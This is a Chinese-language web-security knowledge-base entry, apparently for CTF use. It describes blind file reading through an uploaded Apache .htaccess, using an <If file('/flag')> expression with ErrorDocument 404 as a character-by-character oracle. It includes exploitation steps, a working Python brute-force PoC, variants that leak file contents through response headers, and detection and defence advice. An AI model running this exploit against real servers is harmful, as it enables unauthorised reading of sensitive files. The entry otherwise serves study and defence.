---
id: web-php-file-inclusion-htaccess-if-errordocument-blind-read
title: .htaccess If 表达式盲读：ErrorDocument 404 作为 file('/flag') 前缀匹配 oracle 逐字符爆破
type: scenario
domain: web
path: web/php/file-inclusion
technique: htaccess-if-errordocument-blind-file-read
tags:
- php
- apache
- htaccess
- error-document
- blind-file-read
- oracle
- brute-force
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:36+08:00'
  notes: 已对照原文核对：.htaccess <If "file(\x27/flag\x27) =~ /^prefix/"> + ErrorDocument 404 逐字符 oracle、上传与 404 触发脚本均一致；依赖 AllowOverride 与 httpd 读权限；PoC 未在本机执行。
url: /docs/web/php/file-inclusion/web-php-file-inclusion-htaccess-if-errordocument-blind-read/
draft: false
kb_aliases:
- .htaccess 盲注
- ErrorDocument 404 oracle
- If file() 正则
- Apache 表达式盲读
- htaccess 爆破 flag
- babyUpload
---

## 一句话结论

若应用允许上传/覆盖 `.htaccess`，攻击者可写入 Apache 2.4 的 `<If "file('/flag') =~ /^已知前缀/"> ErrorDocument 404 "wupco" </If>`；当请求一个不存在的路径触发 404 时，只有 flag 前缀匹配才会返回 "wupco"，从而把 `file()` 变成一个逐字符可爆破的盲读 oracle。

## 原理

- **.htaccess 可执行表达式**：Apache 2.4 在 `AllowOverride FileInfo/All` 时允许 `.htaccess` 中的 `<If expr>`、`ErrorDocument`、`Header` 等指令；表达式语言提供 `file()` 函数读取文件内容。
- **布尔 oracle**：`file('/flag') =~ /^prefix/` 为真时，`<If>` 内的 `ErrorDocument 404 "wupco"` 生效，访问任意不存在路径的 404 响应体变成 `wupco`；为假时返回默认 404 页面。攻击者只需判断响应中是否包含标记。
- **逐字符爆破**：从 `flag{` 开始，枚举下一个字符 c，令正则 `^已知前缀c`；匹配成功则追加 c，直到 `}`。每次只需上传一次 `.htaccess` 并请求一次 404。
- **为什么能读文件**：`file()` 在 Apache 表达式求值阶段由 httpd 进程执行，不受 PHP `open_basedir`/`disable_functions` 限制；只要 httpd 用户对 `/flag` 有读权限即可。
- **隐蔽性**：不需要回显文件内容，只泄漏“前缀是否匹配”1 bit；即使 404 页面被统一处理，也可改用不同 `ErrorDocument` 状态码/响应头/重定向作为信号。
- **前提**：上传目录允许 `.htaccess` 生效（`AllowOverride` 未关闭），且上传接口不拒绝 `.htaccess` 文件名。

## 触发条件

- Apache 2.4 + PHP，目标目录 `AllowOverride All`/`FileInfo`，允许 `.htaccess`。
- 存在可上传任意文件名/内容的接口，且上传目录就是 Apache 服务目录或其子目录。
- httpd 进程可读目标文件（如 `/flag`）。
- 存在可触发 404 的路径（任意不存在的文件）。
- 响应差异可被攻击者观察到（状态码/响应体/响应头）。

## 利用步骤

1. 上传 `.htaccess`，内容为：
   ```apache
   <If "file('/flag') =~ /^flag{/">
       ErrorDocument 404 "wupco"
   </If>
   ```
2. 请求一个不存在的路径（如 `/test/non_existent_file`），若响应包含 `wupco`，说明前缀 `flag{` 正确。
3. 枚举下一字符，把正则改为 `^flag{a`、`^flag{b`…，每次重新上传 `.htaccess` 并触发 404。
4. 命中后追加字符，重复直到 `}`，得到完整 flag。
5. 若响应体被统一覆盖，可把 `ErrorDocument` 改为 `302` 跳转、设置自定义响应头，或用不同状态码作为 oracle。

## PoC

```python
import requests, string

BASE = "http://target/"
UPLOAD = BASE + "index.php"
TRIGGER = BASE + "test/non_existent_file"
charset = string.ascii_letters + string.digits + "{}-_@!?"

def check(prefix):
    htaccess = f'''
<If "file('/flag') =~ /^{prefix}/">
ErrorDocument 404 "wupco"
</If>
'''
    requests.post(UPLOAD, files={"file": (".htaccess", htaccess, "application/octet-stream")},
                  data={"submit": "submit"})
    return "wupco" in requests.get(TRIGGER).text

flag = "flag{"
while True:
    for ch in charset:
        if check(flag + ch):
            flag += ch
            print(flag)
            if ch == "}":
                raise SystemExit
            break
```

## 变体与关联

- 变体：用 `ErrorDocument 404 "%{file:/flag}"` 直接回显文件（若表达式允许），或 `Header set X-Flag "%{file:/flag}"` 外带内容。
- 变体：用 `SetEnvIf`/`RewriteCond` 的 `-f`、`%{REQUEST_FILENAME}`、`<If>` 组合构造其它布尔条件（文件存在、目录可读、时间等）。
- 变体：若 `.htaccess` 不允许，尝试 `php.ini`/`user.ini`、`web.config` 或服务器配置注入。
- 关联：[[web-php-open-basedir-bypass-apache-errordocument-file-read]]（ErrorDocument `%{file:}` 直接读文件）、[[web-php-file-inclusion-htaccess-self-include-dirty-bypass]]（.htaccess 自包含）、[[web-generic-file-upload-htaccess-auto-append-php-filter-base64]]（上传 .htaccess 组合 filter chain）。

## 检测与防御

- 防御：禁止上传 `.htaccess`/`.user.ini`/`web.config` 等服务器配置文件；上传目录使用 `AllowOverride None`，或把上传目录移出 Apache 可执行配置范围。
- 防御：关闭不必要的 Apache 表达式/`file()` 能力，限制 httpd 用户对 flag/敏感文件的读权限。
- 检测：上传目录出现 `.htaccess`；404 响应体/状态码异常变化；同一路径被高频请求并伴随 `.htaccess` 重复上传。
- 响应：删除恶意 `.htaccess`，审计上传目录与 Web 配置，检查 flag/敏感文件是否被读取。
